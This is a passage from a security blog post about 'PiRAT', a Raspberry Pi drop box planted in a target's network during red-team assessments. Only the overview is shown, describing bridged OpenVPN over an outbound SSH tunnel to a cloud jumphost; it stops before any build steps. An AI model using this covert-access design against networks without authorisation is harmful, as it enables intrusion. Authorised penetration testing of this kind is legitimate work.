<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>PiRAT - Remote Drop Box &middot; phish</title>
  <meta name="title" content="PiRAT - Remote Drop Box &middot; phish" />
  
  <meta name="description" content="Creating a remote access drop box for red teaming" />
  <meta name="keywords" content="physical-security, remote access tool, " />
  
  
  <link rel="canonical" href="https://dunderhay.github.io/posts/physec/remotebox/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="https://dunderhay.github.io/css/main.bundle.min.e710fe818ed823ffe7095021af5674f138d62388c01f79bf9b601810c2dd5ecb8dea08b6a69f5d6473a97525fc7b9cb8d721f2365f46c69c6df6e64e2dacf625.css"
    integrity="sha512-5xD&#43;gY7YI//nCVAhr1Z08TjWI4jAH3m/m2AYEMLdXsuN6gi2pp9dZHOpdSX8e5y41yHyNl9Gxpxt9uZOLaz2JQ==" />
  
  
  <script type="text/javascript" src="https://dunderhay.github.io/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="https://dunderhay.github.io/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js"
    integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ&#43;dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5&#43;a8AgFUkA==" data-copy="" data-copied=""></script>
  
  <script src="https://dunderhay.github.io/js/zoom.min.js"></script>
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="https://dunderhay.github.io/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="https://dunderhay.github.io/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="https://dunderhay.github.io/favicon-16x16.png" />
  <link rel="manifest" href="https://dunderhay.github.io/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="PiRAT - Remote Drop Box" />
<meta property="og:description" content="Creating a remote access drop box for red teaming" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://dunderhay.github.io/posts/physec/remotebox/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2018-08-23T00:00:00+00:00" />
<meta property="article:modified_time" content="2018-08-23T00:00:00+00:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="PiRAT - Remote Drop Box"/>
<meta name="twitter:description" content="Creating a remote access drop box for red teaming"/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "PiRAT - Remote Drop Box",
    "headline": "PiRAT - Remote Drop Box",
    "description": "Creating a remote access drop box for red teaming",
    "abstract": "Creating a remote access drop box for red teaming",
    "inLanguage": "en",
    "url" : "https:\/\/dunderhay.github.io\/posts\/physec\/remotebox\/",
    "author" : {
      "@type": "Person",
      "name": "Daniel Underhay"
    },
    "copyrightYear": "2018",
    "dateCreated": "2018-08-23T00:00:00\u002b00:00",
    "datePublished": "2018-08-23T00:00:00\u002b00:00",
    
    "dateModified": "2018-08-23T00:00:00\u002b00:00",
    
    "keywords": ["physical-security","remote access tool"],
    
    "mainEntityOfPage": "true",
    "wordCount": "3726"
  }]
  </script>


  
  
  <meta name="author" content="Daniel Underhay" />
  
  
  
  <link href="https://github.com/dunderhay/" rel="me" />
  
  
  <link href="https://au.linkedin.com/in/daniel-underhay" rel="me" />
  
  
  <link href="https://twitter.com/dunderhay" rel="me" />
  
  
  
  

<script src="https://dunderhay.github.io/lib/jquery/jquery.slim.min.js" integrity=""></script>


















  
  

  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
  <div class="relative max-w-[64rem] ml-auto mr-auto">
    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            <a href="https://dunderhay.github.io/" class="text-base font-medium text-gray-500 hover:text-gray-900">phish</a>


        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="https://dunderhay.github.io/posts/"  class="flex items-center">
    
    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Posts">
        Blog
    </p>
</a>


            
            
  <a href="https://github.com/dunderhay/"  target="_blank"  class="flex items-center">
    
    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
        Github
    </p>
</a>


            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400 h-12"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
                    <div class="flex items-center justify-center h-12 dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden h-12 dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
                <div class="flex items-center justify-center h-12 dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden h-12 dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" for="menu-controller" class="block">
            <input type="checkbox" id="menu-controller" class="hidden" />
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li>
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    
                    

                    
  <li class="mt-1">
    <a href="https://dunderhay.github.io/posts/"  class="flex items-center">
        
        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Posts">
            Blog
        </p>
    </a>
</li>



                    

                    
  <li class="mt-1">
    <a href="https://github.com/dunderhay/"  target="_blank"  class="flex items-center">
        
        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
            Github
        </p>
    </a>
</li>



                    
                    

                </ul>
                

            </div>
        </label>
    </div>
</div>




<script>
    (function () {
        var $mainmenu = $('.main-menu');
        var path = window.location.pathname;
        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
            $(e).children('p').addClass('active');
        });
    })();
</script>


  </div>
</div>
<script>
  window.addEventListener('scroll', function (e) {
    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
    var background_blur = document.getElementById('menu-blur');
    background_blur.style.opacity = (scroll / 300);
  });
</script>

  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  
  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="https://dunderhay.github.io/"
      >phish</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="https://dunderhay.github.io/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="https://dunderhay.github.io/posts/physec/remotebox/"
      >PiRAT - Remote Drop Box</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      PiRAT - Remote Drop Box
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      






























<div class="flex flex-row flex-wrap items-center">
  
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/physical-security/&#34;,'_self');">
    <span class="flex">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
  >
    physical-security
  </span>
</span>

  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/remote-access-tool/&#34;,'_self');">
    <span class="flex">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
  >
    remote access tool
  </span>
</span>

  </span>
  
  
  
  
</div>



    </div>

    
    
    
    
    

    
    
    <div class="flex">
  
  
  
  
  <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
    alt="Daniel Underhay" src="https://dunderhay.github.io/img/me_hue3ce00307929f4e4c18a3d359a467ebd_17776_192x192_fill_q75_box_center.jpeg" />
  
  
  <div class="place-self-center">
    
    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      Author
    </div>
    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      Daniel Underhay
    </div>
    
    
    <div class="text-sm text-neutral-700 dark:text-neutral-400">ðŸ‘‹</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/dunderhay/"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://au.linkedin.com/in/daniel-underhay"
          target="_blank"
          aria-label="Linkedin"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://twitter.com/dunderhay"
          target="_blank"
          aria-label="Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>

  </span>

</span></a
        >
      
    
  </div>

</div>
  </div>
</div>
    

    

    

    
    <div class="mb-5"></div>
    
  
  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">

         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#overview">Overview</a></li>
    <li><a href="#how-it-works">How it works</a>
      <ul>
        <li><a href="#dropping-pirat">Dropping PiRAT</a></li>
        <li><a href="#management-of-pirat">Management of PiRAT</a></li>
        <li><a href="#ssh-vpn-tunnel">SSH &ldquo;VPN Tunnel&rdquo;</a></li>
        <li><a href="#bridged-openvpn-configuration">Bridged OpenVPN Configuration</a></li>
      </ul>
    </li>
    <li><a href="#hardware-components">Hardware Components</a></li>
    <li><a href="#the-build">The Build</a>
      <ul>
        <li><a href="#raspberry-pi">Raspberry Pi</a>
          <ul>
            <li><a href="#initial-setup">Initial Setup</a></li>
            <li><a href="#management-interface-config">Management Interface Config</a></li>
            <li><a href="#ssh-tunnel-config">SSH Tunnel Config</a></li>
            <li><a href="#openvpn-setup">OpenVPN Setup</a></li>
            <li><a href="#generating-openvpn-certificates">Generating OpenVPN Certificates</a></li>
            <li><a href="#openvpn-server-config">OpenVPN Server Config</a></li>
          </ul>
        </li>
        <li><a href="#jumphost-ec2-vps-config">Jumphost (EC2 VPS) Config</a></li>
        <li><a href="#attacker-machine-config">Attacker Machine Config</a></li>
      </ul>
    </li>
    <li><a href="#operating-pirat">Operating PiRAT</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#overview">Overview</a></li>
    <li><a href="#how-it-works">How it works</a>
      <ul>
        <li><a href="#dropping-pirat">Dropping PiRAT</a></li>
        <li><a href="#management-of-pirat">Management of PiRAT</a></li>
        <li><a href="#ssh-vpn-tunnel">SSH &ldquo;VPN Tunnel&rdquo;</a></li>
        <li><a href="#bridged-openvpn-configuration">Bridged OpenVPN Configuration</a></li>
      </ul>
    </li>
    <li><a href="#hardware-components">Hardware Components</a></li>
    <li><a href="#the-build">The Build</a>
      <ul>
        <li><a href="#raspberry-pi">Raspberry Pi</a>
          <ul>
            <li><a href="#initial-setup">Initial Setup</a></li>
            <li><a href="#management-interface-config">Management Interface Config</a></li>
            <li><a href="#ssh-tunnel-config">SSH Tunnel Config</a></li>
            <li><a href="#openvpn-setup">OpenVPN Setup</a></li>
            <li><a href="#generating-openvpn-certificates">Generating OpenVPN Certificates</a></li>
            <li><a href="#openvpn-server-config">OpenVPN Server Config</a></li>
          </ul>
        </li>
        <li><a href="#jumphost-ec2-vps-config">Jumphost (EC2 VPS) Config</a></li>
        <li><a href="#attacker-machine-config">Attacker Machine Config</a></li>
      </ul>
    </li>
    <li><a href="#operating-pirat">Operating PiRAT</a></li>
  </ul>
</nav>
  </div>
</details>

 
<script>
  (function () {
    var $toc = $('#TableOfContents');
    if ($toc.length > 0) {
      var $window = $(window);

      function onScroll() {
        var currentScroll = $window.scrollTop();
        var h = $('.anchor');
        var id = "";
        h.each(function (i, e) {
          e = $(e);
          if (e.offset().top - $(window).height()/3 <= currentScroll) {
            id = e.attr('id');
          }
        });
        var active = $toc.find('a.active');      
        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;

        active.each(function (i, e) {
           
            $(e).removeClass('active').siblings('ul').hide();
          
        });
        $toc.find('a[href="#' + id + '"]').addClass('active')
        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
          $(e).children('a').parents('ul').show();          
        });
      }

      $window.on('scroll', onScroll);
      $(document).ready(function () {
         
          $toc.find('a').parent('li').find('ul').hide();
        
        onScroll();
      });
    }
  })();
</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="max-w-prose mb-20">
          <div id="overview" class="anchor"></div>
<h2 class="relative group">Overview 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span>        
    
</h2>
<p>One of the goals during red team engagements and physical assessments is to gain remote access to the target network. Generally, this is the point in the engagement where I find an unattended, network connected VoIP phone in the reception area or spare network port in a meeting room, which I attempt to plug the <a href="https://shop.hak5.org/products/lan-turtle"   target="_blank">
    LanTurtle</a> into to try gain remote access.</p>
<p>However, there are several frustrations when it comes to using the LanTurtle, so I have created my solution using a Raspberry Pi, along with a crafty OpenVPN configuration, that allows you to seamlessly bridge into the remote network. Throughout this post I will refer to this as &ldquo;PiRAT&rdquo;.</p>
<p>PiRAT will act as an OpenVPN server and the attacker on a remote laptop as the VPN client, who can obtain an IP address from the targets DHCP server through OpenVPN operating in bridged mode.</p>
<p>When plugged into a live network port, PiRAT will not attempt to tunnel out of the network on its own. You will need to install the device and connect to the management interface. For this blog, I am using the on-board wireless adapter on the Raspberry Pi to stand-up an access point (AP) that you can connect to. Once connected to the management AP, the attacker can SSH into PiRAT and review which ports are allowed through the firewall and establish an outbound SSH connection used for tunneling VPN traffic.</p>
<p>The management interface could easily be changed from wifi to 3G/4G, by adding an external dongle to avoid the range limitations of wifi.</p>
<div id="how-it-works" class="anchor"></div>
<h2 class="relative group">How it works 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#how-it-works" aria-label="Anchor">#</a></span>        
    
</h2>
<div id="dropping-pirat" class="anchor"></div>
<h3 class="relative group">Dropping PiRAT 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#dropping-pirat" aria-label="Anchor">#</a></span>        
    
</h3>
